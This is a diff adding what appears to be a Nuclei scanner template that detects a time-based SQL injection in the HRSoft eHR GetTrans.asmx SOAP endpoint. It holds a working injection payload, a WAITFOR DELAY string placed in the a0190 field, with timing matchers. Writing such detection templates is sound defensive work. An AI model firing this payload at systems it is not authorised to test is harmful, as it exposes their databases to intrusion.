@@ -1,0 +1,45 @@
+id: hrsoft-ehr-gettrans-sqli
+
+info:
+  name: HRSoft eHR GetTrans.asmx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in the HRSoft eHR GetTrans.asmx API endpoint.
+
+variables:
+  t1: '{{rand_int(4,9)}}'
+  t2: '{{to_number(t1) + 3}}'
+
+http:
+  - raw:
+      - |
+        POST /ws/GetTrans.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetWorkListInfo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetWorkListInfo xmlns="http://tempuri.org/">
+              <a0190>1';WAITFOR DELAY '0:0:{{t1}}'--</a0190>
+            </GetWorkListInfo>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "GetWorkListInfoResult"
+          - "GetWorkListInfoResponse"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
